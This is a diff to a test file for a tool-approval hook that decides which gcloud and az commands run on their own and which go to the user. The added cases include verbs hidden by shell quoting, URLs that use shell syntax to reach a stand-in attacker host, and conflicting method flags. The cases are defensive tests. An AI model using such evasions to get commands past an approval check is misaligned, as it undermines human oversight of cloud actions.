@@ -38,6 +38,10 @@ def test_gcloud_read_only_allowed(client, base_event, command):
         "gcloud storage cp list gs://bucket/",
         "gcloud storage rm gs://bucket/list",
         "gcloud secrets versions access latest --secret=list",
+        # Composite write commands, and verbs hidden by shell quoting
+        "gcloud compute instances add-metadata list --metadata=x=y",
+        "gcloud compute instances set-machine-type list --machine-type=e2",
+        'gcloud compute instances d"e"lete list',
     ],
 )
 def test_gcloud_other_commands_defer_to_user(client, base_event, command):
@@ -75,6 +79,9 @@ def test_az_read_only_allowed(client, base_event, command):
         "az rest --method get --url https://management.azure.com:8080@attacker.example/x",
         "az rest --method get --url http://management.azure.com/x",
         "az rest --method get --url //attacker.example/x",
+        # Shell syntax the shell removes: these reach az as //attacker.example
+        'az rest --method get --url /""/attacker.example/x',
+        "az rest --method get --url /$EMPTY/attacker.example/x",
     ],
 )
 def test_az_rest_get_outside_azure_defers_to_user(client, base_event, command):
@@ -107,6 +114,8 @@ def test_az_pr_create_and_pipeline_run_defer_to_user(client, base_event, command
         'az rest --method POST --url "https://dev.azure.com/x/_apis/pipelines/1/preview?api-version=7.1" --body "{}"',
         "az rest --method post --uri https://dev.azure.com/x --body '{}'",
         "az rest --url https://example.com",
+        # With both method flags the later one wins, so neither is trusted
+        "az rest --method GET -m POST --url https://management.azure.com/x",
         "az repos pr update --id 1 --status completed",
         "az pipelines delete --id 1",
         "az group create -n rg -l westeurope",
